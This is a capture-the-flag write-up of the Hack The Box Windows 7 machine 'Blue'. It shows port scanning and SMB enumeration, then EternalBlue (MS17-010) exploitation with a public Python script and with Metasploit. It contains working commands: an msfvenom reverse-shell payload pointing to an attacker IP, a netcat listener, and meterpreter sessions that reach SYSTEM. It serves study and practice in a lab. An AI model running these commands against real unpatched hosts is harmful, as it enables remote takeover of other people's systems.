## Default Information
IP Address: 10.10.10.40\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.40    blue.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.40 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-01 10:11:22 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49154/tcp on 10.10.10.40                                  
Discovered open port 139/tcp on 10.10.10.40                                    
Discovered open port 49152/tcp on 10.10.10.40                                  
Discovered open port 445/tcp on 10.10.10.40                                    
Discovered open port 49155/tcp on 10.10.10.40                                  
Discovered open port 49156/tcp on 10.10.10.40                                  
Discovered open port 49157/tcp on 10.10.10.40                                  
Discovered open port 49153/tcp on 10.10.10.40                                  
Discovered open port 135/tcp on 10.10.10.40  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 135	| msrpc | Microsoft Windows RPC | Open |
| 139	| netbios-ssn | Microsoft Windows netbios-ssn | Open |
| 445	| microsoft-ds | Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) | Open |
| 49152	| msrpc | Microsoft Windows RPC | Open |
| 49153	| msrpc | Microsoft Windows RPC | Open |
| 49154	| msrpc | Microsoft Windows RPC | Open |
| 49155	| msrpc | Microsoft Windows RPC | Open |
| 49156	| msrpc | Microsoft Windows RPC | Open |
| 49157	| msrpc | Microsoft Windows RPC | Open |

From the nmap output, we can guess that the likely Operating System that is being used for this machine is likely to be Microsoft Windows 7 or Microsoft Server 2008 R2

```
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows Vista SP2, Windows 7, or Windows 7 SP1 (96%)
```

Using SMB scripts in nmap, we can find out that the OS being used is Microsoft 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) and the account that is being used on SMB is guest.

```
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
```

## Exploit
### Enumerating shares
Using smbmap, we realize that it allows for null authentication and we can list the permissions of the disk. From the output, we realize that we have read access to the Share and Users directories.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.40 -P 445
[+] Guest session       IP: 10.10.10.40:445     Name: blue.htb                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
```

Using smbclient to enumerate the Share directory, we realize that the Share directory is empty.

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.40/Share    
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

                8362495 blocks of size 4096. 4212836 blocks available
smb: \> 
```

Next, we will move on to enumerate the Users directory. From the Users directory, we are able to find a Public and Default directory. Unforunately, both Public and Default directory are empty.

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.40/Users
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4212836 blocks available
smb: \> ls Default
  Default                           DHR        0  Tue Jul 14 03:07:31 2009

                8362495 blocks of size 4096. 4212836 blocks available
smb: \> ls Public
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4212836 blocks available
smb: \> 
```

Next, let us try to execute commands using smbmap. Unfortunately, we are unable to execute any commands using smbmap.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.40 -P 445 -x "ipconfig /all"                                                1 ⚙
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p "" -H 10.10.10.40 -P 445 -x "whoami" 
```

### CVE-2017-0143

From the nmap output, we realize that this machine is vulnerable to CVE-2017-043, which is also the infamous Eternal Blue exploit used in WannaCry ransomware.

Next, we will execute checker.py to find for accessible named pipes. However, we are unable to find any accessible named pipes but we would require access to accessible named pipes for EternalBlue exploit to work.

```
┌──(HTB2)─(kali㉿kali)-[~/Desktop/MS17-010]
└─$ python checker.py 10.10.10.40    
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

Looking at the code and also, remembering from our previous nmap scan that we have a user called guest, we will modify the username to become guest and check if we can find accessible named pipes. 

```
'''
Script for
- check target if MS17-010 is patched or not.
- find accessible named pipe
'''

USERNAME = 'guest'
PASSWORD = ''
```

Now, we are able to find a few accessible named pipes, and we are also able to find out that the machine is a 64 bit machine. 

```
┌──(HTB2)─(kali㉿kali)-[~/Desktop/MS17-010]
└─$ python checker.py 10.10.10.40
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
```

Next, we will have to generate the reverse shell payload using msfvenom that we will be sending in the EternalBlue exploit that we are going to exploit.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4000 -f exe > rev_shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Just like before, before executing the python script, we will have to modify the username to become guest

```
USERNAME = 'guest'
PASSWORD = ''
```

Finally, we will just execute the script to send the reverse shell payload to the SMB server and spawn the reverse shell.

```
┌──(HTB2)─(kali㉿kali)-[~/Desktop/MS17-010]
└─$ python send_and_execute.py 10.10.10.40 rev_shell.exe
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8003f21ba0
SESSION: 0xfffff8a00a9c2760
FLINK: 0xfffff8a008a22088
InParam: 0xfffff8a008a1515c
MID: 0x703
unexpected alignment, diff: 0xc088
leak failed... try again
CONNECTION: 0xfffffa8003f21ba0
SESSION: 0xfffff8a00a9c2760
FLINK: 0xfffff8a008a35088
InParam: 0xfffff8a008a2815c
MID: 0x703
unexpected alignment, diff: 0xc088
leak failed... try again
CONNECTION: 0xfffffa8003f21ba0
SESSION: 0xfffff8a00a9c2760
FLINK: 0xfffff8a008a42088
InParam: 0xfffff8a008a3c15c
MID: 0x703
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file 6B2H4M.exe...
Opening SVCManager on 10.10.10.40.....
Creating service QwKt.....
Starting service QwKt.....
The NETBIOS connection with the remote host timed out.
Removing service QwKt.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

### Obtaining reverse shell

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

### Obtaining user flag
From the whoami command that we execute in the reverse shell, we realize that we have system privileges. This means that we can obtain the user flag without requiring any privilege escalation.

```
C:\Users\haris\Desktop>type user.txt
type user.txt
<Redacted user flag>
```

### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```

## Post-Exploitation
### CVE-2017-0143 with Metasploit
EternalBlue exploit can also be exploited using Metasploit. CVE-2017-0143 is also classified as MS17-010 in metasploit. To find the exploit on metasploit, we would need to use MS17-010 instead.

Firstly, let us search for metasploit modules that is related to EternalBlue

```
msf6 > search ms17-010
Matching Modules
================
   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

From the output above, 4 seems to be a scanner for EternalBlue exploit. Let us try to use option 4 to check for EternalBlue exploit in 10.10.10.40. From the output, it seems that 10.10.10.40 is likely to be vulnerable to EternalBlue exploit. Apart from that, we can also see that 10.10.10.40 is running on a 64 bit windows system.

```
msf6 > use 4
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Next, let us try to exploit the EternalBlue exploit with option 0.

```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4000
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.16.8:4000 
[*] 10.10.10.40:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.16.8:4000 -> 10.10.10.40:49160) at 2022-01-01 11:36:14 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
